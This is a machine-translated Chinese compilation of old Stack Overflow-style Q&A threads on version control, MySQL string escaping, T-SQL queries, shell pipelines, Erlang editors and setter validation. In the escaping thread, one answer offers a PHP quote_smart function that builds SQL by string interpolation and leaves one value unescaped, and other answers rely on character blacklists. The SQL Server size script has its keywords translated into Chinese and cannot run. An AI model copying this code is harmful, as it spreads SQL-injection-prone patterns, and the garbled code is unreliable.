> 时间：2009-01-12T12:56:58.053

使用 svn 而不是 cvs 的一个重要原因是 svn 支持二进制差异。这对许多程序员来说可能无关紧要，但是如果您要对 10Mb 的映像进行一系列细微的更改，那么每次在您的存储库中都有一个唯一的副本会非常迅速地占用空间。

我在 Windows 上使用 TortoiseSVN，但在 Mac 上使用商业[CornerStone](http://www.zennaware.com/cornerstone/)客户端而不是（现在是商业的）版本客户端。我发现包括 RapidSVN 在内的一系列免费 Mac 客户端有足够多的痛点，让我不得不花大价钱。CornerStone 提供的用于捕获我忘记添加到存储库的文件的安全网对我来说物有所值。我花了很多时间与一个位于相反时区的美国客户合作，所以不能承受忘记添加文件的错误！

* * *

## 回答 #34

> 赞同：-1
> 
> 时间：2008-08-25T14:46:53.037

简短的回答：Subversion 如果你是唯一一个编码它的人，或者你和你一起工作的每个人都在现场。如果您与不同站点的人一起工作并且您的代码库很大，那么 GIT。

Subversion 非常非常容易设置和使用。它也很好，因为你也可以用它做相对复杂的事情，比如将它连接到 Apache 并使用 SSL 或将它插入 Trac 进行项目管理。Subversion 有很多可用的工具，它确实是一个不错的选择。

对于在分布式环境中工作的大型团队中的人来说，GIT 更有用。Linus T. 为 Linux 团队开发了它，因为他对传统存储库的功能不满意。如果您计划与开源项目的人一起工作，那么值得学习。

# mysql - 发送查询时我需要逃避什么？

> ID：2688
> 
> 赞同：21
> 
> 时间：2008-08-05T18:45:46.747
> 
> 标签：mysql, oracle, security

当您执行 SQL 查询时，您必须清理您的字符串，否则用户可能会在您的网站上执行恶意 SQL。

我通常只有一个函数 escape_string(blah)，它：

*   `\`用双转义符( ) 替换转义符 ( `\\`)。
*   `'`用转义的单引号 ( )替换单引号 ( `\'`)。

这足够吗？我的代码有漏洞吗？有没有一个图书馆可以为我快速可靠地做到这一点？

我希望看到 Perl、Java 和 PHP 中的优雅解决方案。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-08-05T19:38:51.023

为了获得最大的安全性、性能和正确性，请使用准备好的语句。以下是使用不同语言（包括 PHP）的大量示例来执行此操作的方法：

[https://stackoverflow.com/questions/1973/what-is-the-best-way-to-avoid-sql-injection-attacks](https://stackoverflow.com/questions/1973/what-is-the-best-way-to-avoid-sql-injection-attacks)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-08-05T18:46:45.683

我也会逃避评论（双破折号）

```
-- 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-08-05T19:28:29.703

在 PHP 中使用的一个很棒的东西是[PDO](http://us2.php.net/pdo)。处理保护您的 SQL（以及所有一般的 SQL 内容）需要大量的猜测。它支持准备好的语句，这对阻止 SQL 注入攻击大有帮助。

[Davey Shafik 等人所著的 The PHP Anthology 101 Essential Tips, Tricks & Hacks 等](https://rads.stackoverflow.com/amzn/click/com/0975841998)书第 2 版中包含了关于 PDO 的精彩入门。让学习变得轻而易举，非常适合作为参考。除了实际的 SQL 查询之外，我什至不必再考虑其他任何事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-05T18:46:41.347

您使用的是哪种语言？似乎它们几乎都有内置的 SQL 转义函数，使用起来会更好。

例如，PHP 有[mysql_real_escape_string](http://us2.php.net/manual/en/function.mysql-real-escape-string.php)和[addlashes](http://us2.php.net/manual/en/function.addslashes.php)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T18:48:23.497

你最好使用带有占位符的准备好的语句。您是否使用 PHP、.NET...无论哪种方式，准备好的语句都会提供更高的安全性，但我可以提供一个示例。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-05T19:21:49.090

在 PHP 中，我正在使用这个，我会很感激关于它的每一条评论：

```
function quote_smart($valeur) 
{ 
    if (get_magic_quotes_gpc()) 
        $valeur = stripslashes($valeur); 

    if (!is_numeric($valeur)) 
        $valeur = mysql_real_escape_string($valeur); 

    return $valeur; 
}

$IdS = quote_smart($_POST['theID']); 
$sql = " 
SELECT * FROM Students 
WHERE IdStudent={$IdS}; 
"; 
```

如果字段可以为 NULL ，则需要再次验证：

```
$picture = NULL;
$theidyouwant = 7;
$Name = 'WOOD';

if(is_null($picture)) 
    $p = 'NULL'; 
else
    $p = "'".quote_smart($picture)."'"; 

$IdS = quote_smart($theidyouwant);

$requete = "SELECT * FROM Students
    WHERE IdStudent={$IdS} AND
    PictureStudent={$p} AND
    NameStudent='{$Name}';
    "; 
```

这就是享受！（希望帖子能正确发送下划线而不是 _ ;）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-08-05T19:55:12.613

使用准备好的/参数化的查询！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-08-14T17:59:02.597

MySQL C API 有它自己的`mysql_escape_string()`. 最好使用它或等效的。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-16T21:14:00.753

使用准备好的语句。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-14T04:57:04.980

在 MySQL 查询中，使用 LIKE 时，还要确保将“_”字符转义，因为它不会被 mysql_real_escape_string 转义。

供参考，请[在此处查看](http://dev.mysql.com/doc/refman/5.0/en/pattern-matching.html)

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2008-08-05T18:49:58.360

我不确定 MySQL 是否支持参数化查询，如果支持，你应该努力走这条路。这将确保用户输入不会做任何恶意的事情。

否则，除了您提到的内容之外，一些“坏”字符将是分号 (;) 和注释（- 和 /* */）。

# sql - 如何使用 T-SQL 分组依据

> ID：2702
> 
> 赞同：32
> 
> 时间：2008-08-05T18:55:35.963
> 
> 标签：sql, sql-server, group-by

我知道我需要（尽管我不知道为什么）`GROUP BY`在使用任何聚合函数（如`count`, `sum`,`avg`等）的 SQL 查询末尾有一个子句：

```
SELECT count(userID), userName
FROM users
GROUP BY userName 
```

还有`GROUP BY`什么时候有用，性能影响是什么？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-08-05T19:32:03.360

要从具有超过 5 个小部件的每个小部件类别中检索小部件的数量，您可以执行以下操作：

```
SELECT WidgetCategory, count(*)
FROM Widgets
GROUP BY WidgetCategory
HAVING count(*) > 5 
```

“have”子句是人们经常忘记的东西，而是选择将所有数据检索到客户端并在那里迭代。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2008-08-19T14:02:49.113

GROUP BY 与 DISTINCT 类似，因为它将多条记录组合为一个。

[此示例从http://www.devguru.com/technologies/t-sql/7080.asp](http://www.devguru.com/technologies/t-sql/7080.asp)借用，在 Products 表中列出了不同的产品。

```
SELECT Product FROM Products GROUP BY Product

Product
-------------
Desktop
Laptop
Mouse
Network Card
Hard Drive
Software
Book
Accessory 
```

GROUP BY 优于 DISTINCT 的优势在于，当与 HAVING 子句一起使用时，它可以为您提供精细控制。

```
SELECT Product, count(Product) as ProdCnt
FROM Products
GROUP BY Product
HAVING count(Product) > 2

Product      ProdCnt
--------------------
Desktop          10
Laptop            5
Mouse             3
Network Card      9
Software          6 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-08-05T19:01:10.973

Group By 强制在返回记录之前填充整个集合（因为它是隐式排序）。

出于这个原因（以及许多其他原因），切勿在子查询中使用 Group By。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-08-05T18:58:35.067

计算使用标签的次数可能是一个谷歌示例：

```
SELECT TagName, Count(*)
AS TimesUsed
FROM Tags
GROUP BY TagName ORDER TimesUsed 
```

如果您只是想要一个不同的标签值，我更愿意使用该`DISTINCT`语句。

```
SELECT DISTINCT TagName
FROM Tags
ORDER BY TagName ASC 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T19:00:39.557

当您想要生成一个平均或汇总一堆数据的报告时，GROUP BY 也有帮助。您可以按部门 ID 和 SUM 对每个月的所有销售收入或 AVG 进行分组。

# language-agnostic - 如何判断用户最后一次按下键（或移动鼠标）的时间？

> ID：2709
> 
> 赞同：9
> 
> 时间：2008-08-05T19:06:40.510
> 
> 标签：language-agnostic

在**Win32**环境中，您可以使用[Microsoft 文档中的](https://docs.microsoft.com/windows/desktop/api/winuser/nf-winuser-getlastinputinfo)**GetLastInputInfo API**调用。基本上，此方法返回与用户上次提供输入的时间相对应的最后一个刻度，您必须将其与当前刻度进行比较以确定那是多长时间以前。

[Xavi23cr 在codeproject](http://www.codeproject.com/KB/cs/GetIdleTimeWithCS.aspx)有一个很好的 C#示例。

对其他环境有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-08-05T19:14:47.560

至于 Linux，我知道 Pidgin 必须确定空闲时间才能在一定时间后将您的状态更改为离开。您可能会打开源代码并查看是否可以找到执行所需操作的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-06T01:58:18.353

你似乎已经回答了你自己的问题 Nathan ;-) “GetLastInputInfo” 是要走的路。

一个技巧是，如果您的应用程序在桌面上运行，并且用户连接到虚拟机，则 GetLastInputInfo 将报告没有活动（因为主机上没有活动）。

这可能与您想要的行为不同，具体取决于您希望如何应用用户输入。

# css - 哪些网站提供免费的优质网站设计模板？

> ID：2711
> 
> 赞同：26
> 
> 时间：2008-08-05T19:08:47.543
> 
> 标签：css, templates

让我们汇总一个免费的优质网站设计模板列表。那里有一百万个这样的网站，但大多数都是重复和无聊的。

我将从[freeCSStemplates.org开始](http://www.freecsstemplates.org/)

我也认为其他网站应该遵循某种标准，例如这里是 freeCSStemplates 标准

*   根据知识共享署名 2.5 许可免费发布
*   在图像方面非常轻巧
*   无表格（即他们不使用表格进行布局）
*   符合 W3C 标准且有效（XHTML Strict）
*   提供公共领域的照片，由 PDPhoto.org 和 Wikimedia Commons 慷慨提供

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-08-05T20:00:14.223

查看：

*   [开源网页设计](http://www.oswd.org/)
*   [CSS 混音](http://cssremix.com/)
*   [最佳网络画廊](http://bestwebgallery.com/)
*   [基于 CSS](http://www.cssbased.com/)
*   [CSS美](http://www.cssbeauty.com/gallery/)
*   [CSS 天才](http://www.my3w.org)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-08-05T19:19:03.513

[开放设计社区](http://www.opendesigns.org/)是一个很好的资源。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-05T19:10:49.130

[http://www.csszengarden.com/](http://www.csszengarden.com/)

图片不是知识共享，但 CSS 是。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-05T19:11:45.383

[禅宗花园](http://www.csszengarden.com/)+1 。

我喜欢[inobscuro.com上的资源](http://inobscuro.com/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T19:25:06.307

[http://www.opensourcetemplates.org/](http://www.opensourcetemplates.org/)设计不错，只是选择不够。

# sql-server - 我需要知道一个表在 SQL Server 中使用了多少磁盘空间

> ID：2714
> 
> 赞同：15
> 
> 时间：2008-08-05T19:10:52.327
> 
> 标签：sql-server

我认为大多数人都知道如何通过 GUI（右键单击表、属性）来执行此操作，但在 T-SQL 中执行此操作完全很困难。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-08-05T19:11:11.453

```
创建表#tmpSizeChar (
     表名系统名，
     row_count 整数，
     reserved_size varchar(50),
     数据大小 varchar(50),
     index_size varchar(50),
     未使用大小 varchar(50))                              

创建表#tmpSizeInt (
     表名系统名，
     row_count 整数，
     reserved_size_KB int,
     data_size_KB 整数，
     index_size_KB 整数，
     未使用的大小 KB 整数）   

设置无计数
插入 #tmpSizeChar
EXEC sp_msforeachtable 'sp_spaceused ''?'''     

插入 #tmpSizeInt (
        表名，
        行数，
        reserved_size_KB,
        data_size_KB,
        index_size_KB,
        未使用大小 KB
        )
选择 [table_name]，
        行数，
        CAST(SUBSTRING(reserved_size, 0, PATINDEX('% %', reserved_size)) AS int)reserved_size,
        CAST(SUBSTRING(data_size, 0, PATINDEX('% %', data_size)) AS int)data_size,
        CAST(SUBSTRING(index_size, 0, PATINDEX('% %', index_size)) AS int)index_size,
        CAST(SUBSTRING(unused_size, 0, PATINDEX('% %', used_size)) AS int)unused_size
来自#tmpSizeChar   

/*
删除表#tmpSizeChar
删除表#tmpSizeInt
*/

选择 * 从 #tmpSizeInt
ORDER BY reserved_size_KB DESC

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-08-05T19:16:19.133

看看这个，我知道它在 2005 年有效（[微软文档](https://docs.microsoft.com/sql/relational-databases/system-catalog-views/sys-database-files-transact-sql)）：

这是 pubs DB

```
 select *
from pubs.sys.database_files 
```

返回大小和 max_size。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-14T16:40:56.830

sp_spaceused 表名

其中 tableName 是您想知道的表的名称。

# dash-shell - Shell 脚本输入重定向异常

> ID：2732
> 
> 赞同：22
> 
> 时间：2008-08-05T19:26:00.720
> 
> 标签：dash-shell

谁能解释这种行为？跑步：

```
#!/bin/sh
echo "hello world" | read var1 var2
echo $var1
echo $var2 
```

没有任何输出，而：

```
#!/bin/sh
echo "hello world" > test.file
read var1 var2 < test.file
echo $var1
echo $var2 
```

产生预期的输出：

```
hello
world 
```

管道不应该一步完成重定向到 test.file 在第二个示例中所做的事情吗？我对 dash 和 bash shell 都尝试了相同的代码，并从它们中得到了相同的行为。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-26T12:10:13.397

最近添加的`bash`是`lastpipe`选项，当作业控制被停用时，它允许管道中的最后一个命令在当前 shell 中运行，而不是在子 shell 中运行。

```
#!/bin/bash
set +m      # Deactiveate job control
shopt -s lastpipe
echo "hello world" | read var1 var2
echo $var1
echo $var2 
```

确实会输出

```
hello
world 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-09-19T02:20:35.417

```
#!/bin/sh
echo "hello world" | read var1 var2
echo $var1
echo $var2 
```

不会产生任何输出，因为管道在子外壳中运行它们的每个组件。子shell*继承父shell 变量的副本*，而不是共享它们。试试这个：

```
#!/bin/sh
foo="contents of shell variable foo"
echo $foo
(
    echo $foo
    foo="foo contents modified"
    echo $foo
)
echo $foo 
```

括号定义了在子 shell 中运行的代码区域，并且 $foo 在其中被修改后保留其原始值。

现在试试这个：

```
#!/bin/sh
foo="contents of shell variable foo"
echo $foo
{
    echo $foo
    foo="foo contents modified"
    echo $foo
}
echo $foo 
```

大括号纯粹是为了分组，没有创建子shell，大括号内修改的 $foo 与外面修改的 $foo 相同。

现在试试这个：

```
#!/bin/sh
echo "hello world" | {
    read var1 var2
    echo $var1
    echo $var2
}
echo $var1
echo $var2 
```

在大括号内，内置的 read 正确地创建了 $var1 和 $var2 ，您可以看到它们得到了回显。在大括号之外，它们不再存在。大括号内的所有代码都在子shell 中运行，*因为它是 pipeline 的一个组件*。

您可以在大括号之间放置任意数量的代码，因此当您需要运行一个解析其他输出的 shell 脚本块时，您可以使用这种管道到块的构造。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-08-15T15:52:01.110

这已经得到了正确的回答，但尚未说明解决方案。使用 ksh，而不是 bash。比较：

```
$ echo 'echo "hello world" | read var1 var2
echo $var1
echo $var2' | bash -s 
```

到：

```
$ echo 'echo "hello world" | read var1 var2
echo $var1
echo $var2' | ksh -s
hello
world 
```

ksh 是一个优秀的编程外壳，因为这样的小细节。（在我看来，bash 是更好的交互式 shell。）

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2008-09-17T00:17:05.340

```
read var1 var2 < <(echo "hello world") 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-08-05T20:09:15.377

好吧，我想通了！

这是一个很难捕捉的错误，但它是由 shell 处理管道的方式造成的。管道的每个元素都在单独的进程中运行。当读取命令设置 var1 和 var2 时，将它们设置为自己的子 shell，而不是父 shell。所以当 subshel​​l 退出时，var1 和 var2 的值会丢失。但是，您可以尝试做

```
var1=$(echo "Hello")
echo var1 
```

它返回预期的答案。不幸的是，这只适用于单个变量，你不能一次设置很多。为了一次设置多个变量，您必须读入一个变量并将其分割成多个变量，或者使用如下内容：

```
set -- $(echo "Hello World")
var1="$1" var2="$2"
echo $var1
echo $var2 
```

虽然我承认它不像使用管道那么优雅，但它确实有效。当然你应该记住 read 是从文件中读取到变量中的，所以从标准输入中读取应该有点困难。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2008-09-14T17:00:04.750

该帖子已得到适当的回答，但我想提供一种替代的衬里，它可能会有一些用处。

要将空间分隔值从 echo （或 stdout ）分配给 shell 变量，您可以考虑使用 shell 数组：

```
$ var=( $( echo 'hello world' ) )
$ echo ${var[0]}
hello
$ echo ${var[1]}
world 
```

在此示例中，var 是一个数组，可以使用构造 ${var[index]} 访问其内容，其中 index 是数组索引（从 0 开始）。

这样，您可以将任意数量的参数分配给相关的数组索引。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2008-08-05T20:00:43.023

这是因为管道版本正在创建一个子shell，它将变量读入其本地空间，然后在子shell退出时将其销毁。

执行这个命令

```
$ echo $$;cat | read a
10637 
```

并使用 pstree -p 查看正在运行的进程，您将看到一个额外的外壳挂在您的主外壳上。

```
 |                       |-bash(10637)-+-bash(10786)
    |                       |             `-cat(10785) 
```

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-03-04T09:52:39.953

我对这个问题的看法（使用 Bash）：

```
read var1 var2 <<< "hello world"
echo $var1 $var2 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-09-17T02:15:03.743

尝试：

```
echo "hello world" | (read var1 var2 ; echo $var1 ; echo $var2 ) 
```

正如许多人所说，问题在于 var1 和 var2 是在子 shell 环境中创建的，当该子 shell 退出时会被破坏。以上避免破坏子shell，直到结果被回显。另一种解决方案是：

```
result=`echo "hello world"`
read var1 var2 <<EOF
$result
EOF
echo $var1
echo $var2 
```

# ide - 搭建 Erlang 开发环境

> ID：2742
> 
> 赞同：50
> 
> 时间：2008-08-05T19:39:19.710
> 
> 标签：ide, erlang

我对研究 Erlang 很感兴趣，并希望在启动和运行时遵循阻力最小的路径。

目前，我正计划安装[Erlang R12B-3](http://www.erlang.org/download.html)和[Erlide](http://erlide.sourceforge.net/)（[Eclipse](http://www.eclipse.org/)插件）。这在很大程度上是基于谷歌结果的决定。最初这将在 Windows XP 系统上进行，但不久之后我可能会在 Ubuntu 上重现该环境。

有明显更好的选择吗？即使它绑定到一个平台。

请分享您的经验。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-09-16T14:33:32.510

我强烈推荐标准 Erlang 发行版附带的 Erlang 模式。我整理了一个“开箱即用”的 Emacs 配置，其中包括：

*   语法高亮和上下文相关缩进
*   动态编译，即时错误高亮
*   集成 Erlang 外壳
*   和更多....

你可以在这里浏览我的 GitHub 存储库：

[http://github.com/kevsmith/hl-emacs](http://github.com/kevsmith/hl-emacs)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2008-08-05T20:54:06.660

我只在 Erlang 中进行了少量编码，但我发现最有用的方法就是在文本编辑器中编写代码，然后打开一个终端以根据需要构建我的代码（这是在 Linux 中，但是我敢肯定，类似的想法也适用于 Windows）。

你的问题没有提到它，但如果你正在寻找一本关于 Erlang 的好书，试试O'Reilly 的[这本书。](http://oreilly.com/catalog/9780596518189/)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-12-19T10:32:07.383

你也可以试试**NetBeans**有一个非常好的 Erlang 模块可用：**ErlyBird**

1.  安装二郎：`sudo aptitude install erlang`
2.  安装最新的 JDK：`sudo aptitute install sun-java6-jdk`
3.  下载并安装（最小的）NetBeans 版本（例如 PHP 版本）：[www.netbeans.org/downloads](http://www.netbeans.org/downloads/index.html)
4.  下载 erlang 模块**ErlyBird**：[sourceforge.net/projects/erlybird](http://sourceforge.net/projects/erlybird)
5.  通过 NetBeans 手动安装模块

**ErlyBird 特点：**

*   语法检查
*   语法高亮
*   自动完成
*   漂亮的格式化程序
*   出现标记
*   大括号匹配
*   缩进
*   代码折叠
*   功能导航器
*   去申报
*   项目管理
*   Erlang shell 控制台

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-09-15T19:17:42.977

我个人也在一些生产系统中使用 Erlang，在办公室也是如此。对于客户端测试、文档和开发，我使用 MacBook Pro 作为操作系统/平台，使用带有 Erlang 包的 TextMate 作为编辑器。

对于服务器端开发和部署，我们在生产环境中使用 RHEL 4.x/5.x，对于编辑，我使用 VIM。就个人而言，我有 4 台机器（slicehost.com 上的切片）使用 Erlang 运行 Debian，用于一些网站和工作。

我尝试使用最小的“工程环境”，通常是对 apt 或 yum 的依赖最少的环境。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2008-09-18T16:41:27.820

为了补充 Emacs 的建议，我还建议您在运行 Emacs erlang-mode 时查看 distel 的优势。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-09-15T13:29:30.630

[您还可以尝试像CohesiveFT](http://www.cohesiveft.com/)这样的虚拟服务器按需服务

选择您想要的组件（例如 erlangrb12 + yaws + MySQL + erlyweb），它将构建一个 vm 映像供您下载或放到 ec2 上。

如果您按照实用程序员书籍[Programming Erlang中的说明进行操作，那么在本地滚动您自己也非常简单](http://www.pragprog.com/titles/jaerlang/programming-erlang)

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2009-07-07T05:18:07.860

我在这里看到了建议 TextMate 的答案，所以我想添加另一个好的 Mac OSX 工具：

[ErlangXCode](http://medevyoujane.com/blog/2008/10/4/introducing-erlangx-and-erlangxcode.html)插件到 XCode。

自从我开始使用 Erlang 以来，我一直在使用它，并且真的很喜欢它。

他博客上的下载链接坏了，这里是真正的下载：

[http://github.com/JonGretar/erlangxcode/tree/master](http://github.com/JonGretar/erlangxcode/tree/master)

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-10T12:32:41.183

*快速说明一下：在*[Ciaran 的](http://blog.ciarang.com/posts/compiling-erlang-on-ubuntu)
帖子（针对 Ubuntu 6.10 顺便说一下 ）中描述的 Erlang“编译”过程可以在任何基于 Debian 的发行版中使用**apt命令轻松跳过：**

 **> apt-get 安装 erlang

如果您认为合适，请不要忘记安装这些软件包：
erlang-doc-html - Erlang HTML 文档页面
erlang-examples - 一些应用示例
erlang-manpages - Erlang MAN 页面
erlang-mode - Emacs 的编辑模式

祝你好运！

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-08-06T00:46:01.480

我喜欢贾斯汀的建议，但我会补充一点：这个解决方案非常适合学习一门语言。如果您不依赖于代码完成之类的东西，那么它会迫使您更好地学习语言。（如果您正在使用具有巨大 API 的东西，例如 Java 或 Cocoa，那么您将需要代码完成！）

它也与语言无关，对于解释语言，尤其是具有交互式解释器的语言，您可能会在 shell/解释器中花费同样多的时间来输入命令。即使在一个大型的 python 项目中，我仍然在一个编辑器和 4 或 5 个终端窗口中工作。

因此，诀窍更多的是获得适合您的编辑器。我不打算推​​荐一个，因为那是在传福音！

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-09-15T12:47:58.013

我只使用 Scite。键入一些内容并按 f5 以查看结果。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-12-06T01:47:26.073

刚刚在我的[博客](http://dylanwhite99.blogspot.com/)上写了一篇关于此的指南，这是精简版：

第 1 部分：下载需要下载的内容。

[下载](http://www.erlang.org/download.html)并安装 Erlang 运行时。 [下载](http://www.textpad.com/download/index.html#downloads)并安装 TextPad。

为 Erlang 下载一个 .syn 文件并将其放在 TextPad 的系统文件夹中。对我来说，这个文件夹是 C:\Program Files\TextPad 5\system。我不太确定这个同步文件是谁做的（该网站是另一种语言的），但他们做得很好。

第 2 部分：设置语法高亮。

打开文本板。确保没有文件被打开。转到“配置”菜单，然后选择“首选项”。在首选项窗口中，单击“文档类”。应该有一个当前认可的语言列表。单击“新建”按钮（位于语言列表的正下方），然后键入“Erlang”。单击应用。

单击“文档类”旁边的“+”按钮。这应该扩展列表，Erlang 现在应该在它上面。点击二郎。您应该会看到与 Erlang 关联的文件扩展名列表，单击“新建”，然后键入“*.erl”。

现在单击左侧“Erlang”旁边的“+”按钮。这应该会展开一个包含更多菜单的列表。单击“语法”。单击下拉菜单并选择 erlang.syn。如果 erlang.syn 不存在，则 .syn 文件没有正确放置。

随意编辑一些其他语法选项以根据您的喜好自定义 TextPad。

第 3 部分：从 TextPad 编译。

**注意：截至 2008 年 5 月 12 日，在 textpad 中编译存在严重问题。Erlang shell 在文本键盘中完成新编译时会以某种方式忽略它。这仅对检查错误有用，当您想要实际运行代码时，在 Erlang Shell 中编译它。**

再次在首选项菜单中，单击左侧的“工具”。

单击“添加”按钮并选择“程序...”。导航到 erl5.6.5\erts-5.6.5\bin\ 文件夹并选择 erlc.exe。选择并单击列表中的新条目以重命名它。点击“应用”。

现在单击左侧工具旁边的“+”按钮。选择 erlc，或者任何你命名的新工具（我命名我的 'Compile Erlang'）。参数字段需要读取'$File'，初始文件夹字段应该读取'$FileDir'。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-11-27T20:48:36.293

我在 Erlide 上取得了很好的成功。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2012-01-14T16:13:40.160

如果您使用 Vim，我推荐您使用**Vimerl** ( [http://github.com/jimenezrick/vimerl](http://github.com/jimenezrick/vimerl) )：

## 特征

*   语法高亮
*   代码缩进
*   代码折叠
*   代码全方位完成
*   带有 quickfix 支持的语法检查
*   OTP 行为的代码框架
*   使用 Rebar 的配置
*   病原体兼容 (http://github.com/tpope/vim-pathogen)

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-09-15T15:49:09.063

由于您最终还是要切换到 Ubuntu，因此我强烈建议您对 emacs 使用 erlang-mode（它与 Erlang 发行版捆绑在一起）。由于它为您提供了许多功能，因此它正式成为所有核心开发人员使用的以及许多其他开发人员使用的。

安装 Erlang 发行版本身应该很简单 :)

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-08-22T12:25:51.793

从我尝试过的（并且仍然要做）来看，这是对 erlang 开发人员的一个很好的补充。环境将是运行 ubuntu/yaws/erlang 的虚拟机。也许[Erlyweb](http://feeds.feedburner.com/10xSoftwareDevelopment?format=xml)（erlang/yaws 框架）也可以很好地检查一下。

[Ciaran](http://blog.ciarang.com/posts/compiling-erlang-on-ubuntu)关于他的 erlang 安装的帖子（这将是他的“系列”中的第一篇）很好，因为他详细介绍了设置服务器的步骤（以及其他东西，例如带有 jabberlang 的 xmpp）。**

# optimization - 在 Getter/Setter 或其他地方进行数据验证？

> ID：2750
> 
> 赞同：11
> 
> 时间：2008-08-05T19:51:29.220
> 
> 标签：optimization, setter, getter, verification

我想知道在**getter**和**setter**或代码的其他地方进行**验证是否是个好主意。**

 ****当涉及到**优化**和**加速**代码时，这可能会让您感到惊讶，我认为您不应该在 getter 和 setter 中进行验证，而应该在**更新**文件或数据库的代码中进行验证。我错了吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-08-05T19:59:39.157

好吧，类通常包含具有公共 getter/setter 的私有成员的原因之一正是因为它们可以验证数据。

如果你的数字可以在 1 到 100 之间，我肯定会在 setter 中放入一些东西来验证它，然后可能会抛出一个被代码捕获的异常。原因很简单：如果在setter中不做，每次设置都要记住1到100的限制，导致代码重复或者忘记了导致状态无效。

至于性能，我在这里和 Knuth 在一起：

> “我们应该忘记小的效率，比如大约 97% 的时间：过早的优化是万恶之源。”

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-08-08T00:07:08.967

@Terrapin，回复：

> 如果你只有一堆 [simple public set/get] 属性......它们也可能是字段

与字段相比，属性具有其他优势。它们是更明确的契约，它们是序列化的，它们可以稍后调试，它们是通过继承进行扩展的好地方。笨拙的语法是一种意外的复杂性——例如 .net 3.5 克服了这一点。

一种常见的（但有缺陷的）做法是从公共字段开始，然后在“根据需要”的基础上将它们转换为属性。这会破坏您与使用您的课程的任何人的合同，因此最好从属性开始。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-08-05T19:59:05.007

从拥有最可维护代码的角度来看，我认为您应该在属性的设置器中进行尽可能多的验证。这样您就不会缓存或以其他方式处理无效数据。

毕竟，这就是属性的意义所在。如果您拥有的只是一堆属性，例如...

```
public string Name
{
    get
    {
        return _name;
    }
    set
    {
        _name = value;
    }
} 
```

...它们也可能是字段

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-08-05T19:59:13.010

这取决于。

一般来说，代码应该很快就会失败。如果该值可以由代码中的多个点设置，并且您仅在检索该值后才进行验证，则该错误似乎出现在执行更新的代码中。如果设置器验证输入，您就知道哪些代码试图设置无效值。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-08-05T19:55:52.127

验证应该与验证方法中的 getter 或 setter 分开捕获。这样，如果需要跨多个组件重用验证，它是可用的。

当调用 setter 时，应该使用这样的验证服务来清理对象的输入。这样您就知道存储在对象中的所有信息在任何时候都是有效的。

您不需要对 getter 进行任何类型的验证，因为对象上的信息已经被认为是有效的。

在数据库更新之前不要保存您的验证！！最好**快点失败**。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-08-05T20:03:46.730

你可能想看看Eric Evans 的[领域驱动设计](http://books.google.com/books?id=7dlaMs0SECsC)。DDD 有这个规范的概念：

> ... 用于特定目的的显式谓词类 VALUE OBJECTS。SPECIFICATION 是一个谓词，用于确定一个对象是否满足某些标准。

我认为快速失败是一回事，另一件事是在哪里保留验证逻辑。域是保留逻辑的正确位置，我认为您的域对象上的规范对象或验证方法将是一个好地方。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-08-07T22:24:01.610

我喜欢实现[IDataErrorInfo](http://msdn.microsoft.com/en-us/library/system.componentmodel.idataerrorinfo.aspx)并将我的验证逻辑放在它的 Error 和 this[columnName] 属性中。这样，如果您想以编程方式检查是否存在错误，您可以简单地在代码中测试这些属性中的任何一个，或者您可以将验证交给 Web 窗体、Windows 窗体或 WPF 中的数据绑定。

